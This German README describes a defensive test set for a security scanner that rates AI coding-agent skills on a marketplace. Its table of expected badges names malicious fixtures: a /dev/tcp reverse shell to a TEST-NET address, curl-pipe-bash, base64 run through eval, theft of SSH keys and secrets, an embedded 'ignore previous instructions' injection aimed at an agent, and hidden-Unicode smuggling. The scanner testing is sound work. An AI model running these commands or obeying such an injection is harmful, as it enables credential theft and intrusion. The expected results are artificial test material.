# Denofy Scanner Testset

Testfixtures zur **Validierung des Sicherheitsscanners von Denofy** (Marktplatz für
KI-Coding-Agent-Skills). Der Scanner vergibt die Badges **verified**, **warning**, **failed**.

> **Defensive Testdaten.** Alle Dateien hier sind **inert** und dienen ausschließlich dazu,
> zu prüfen, ob der Scanner bösartige Skills korrekt erkennt (ohne Fehlalarme bei harmlosen).
> **Nichts wird ausgeführt, nichts hochgeladen, nichts veröffentlicht.** Bösartige Payloads
> sind mit `# TESTFIXTURE — NICHT AUSFÜHREN` markiert und nutzen ausschließlich
> Platzhalter-Ziele (`*.attacker.example.com`, `203.0.113.x` aus TEST-NET-3). Es werden
> **keine echten Exfiltrations-Endpunkte oder Reverse-Shell-Ziele** verwendet.

## Struktur
- `malicious/` — Skills, die der Scanner **ablehnen** soll (erwartet: failed).
- `benign/` — harmlose Skills (erwartet: verified).
- `benign-tricky/` — harmlose Skills mit **Fehlalarm-Risiko**; der Scanner darf **nicht** failen.

Jeder Skill ist ein eigener Ordner mit einer `SKILL.md` (Frontmatter: `name`, `description`).
Oben in jeder `SKILL.md` steht zusätzlich eine Zeile `# EXPECTED: <badge> — <Grund>`.

## Erwartete Ergebnisse

| # | Skill | Ordner | Erwartetes Badge | Begründung |
|---|-------|--------|------------------|------------|
| 1 | prompt-injection | `malicious/` | **failed** | Eingebettete Prompt-Injection ("Ignoriere vorherige Anweisungen…"), die den Agenten zur Exfiltration von Credentials/Env anweist. |
| 2 | hidden-unicode | `malicious/` | **failed** | Versteckte Zero-Width- (U+200B) und Bidi-Override-Zeichen (U+202E, U+200D) schmuggeln verdeckten Text/Befehle ein. |
| 3 | curl-pipe-bash | `malicious/` | **failed** | Verschleierter `curl … \| bash` Download-und-Ausführen, inkl. Base64-Variante. |
| 4 | base64-obfuscation | `malicious/` | **failed** | Base64-kodierter Befehl wird dekodiert und per `eval` ausgeführt. |
| 5 | ssh-key-theft | `malicious/` | **failed** | Liest `~/.ssh/id_rsa`/`id_ed25519` und exfiltriert sie an Platzhalter-Host. |
| 6 | env-var-exfil | `malicious/` | **failed** | Sammelt Umgebungsvariablen (Tokens/Keys/Secrets) und sendet sie weg. |
| 7 | reverse-shell | `malicious/` | **failed** | Klassische Reverse-Shell (`bash -i >& /dev/tcp/203.0.113.5/4444`), plus Python-Variante. |
| 8 | generic-exfil | `malicious/` | **failed** | `tar` sensibler Dateien (`.netrc`, `.git-credentials`) + `curl POST` an Platzhalter-Domain. |
| 9 | delayed-attack | `malicious/` | **failed** (mind. warning) | v1.0 harmlos, aber v2.0/Changelog-Block führt `curl \| bash` ein — Attack-in-later-version. Scan des gesamten Skills muss failed geben; warning nur, falls Versions-Diff unvollständig. |
| 10 | simple-formatter | `benign/` | **verified** | Harmloser Code-Formatierer (prettier/black/gofmt), keine Netzwerk-/Fremdzugriffe. |
| 11 | git-helper | `benign/` | **verified** | Nur lokale Git-Operationen (branch/commit/rebase). |
| 12 | test-runner | `benign/` | **verified** | Führt lokale Testsuites aus, keine externen Downloads/Exfiltration. |
| 13 | security-checklist | `benign-tricky/` | **verified** | Checkliste, die VOR `curl\|bash` etc. **warnt**; Muster nur als Negativbeispiel zitiert — darf nicht failen. |
| 14 | incident-response-doc | `benign-tricky/` | **verified** | Rein erklärende IR-Doku; nennt Reverse-Shell-/Exfil-Begriffe nur zur Erkennung — darf nicht failen. |

## Hidden-Unicode-Codepoints (Fall 2)
In `malicious/hidden-unicode/SKILL.md` eingebettet:
- **U+200B** ZERO WIDTH SPACE — 7× (verbirgt eingeschmuggelten Text zwischen sichtbaren Zeichen)
- **U+200D** ZERO WIDTH JOINER — 3× (zerteilt `curl`/`bash` so, dass sie als Klartext unauffällig wirken)
- **U+202E** RIGHT-TO-LEFT OVERRIDE (Bidi) — 1× (Dateiname-Spoofing: `user‮txt.exe`)
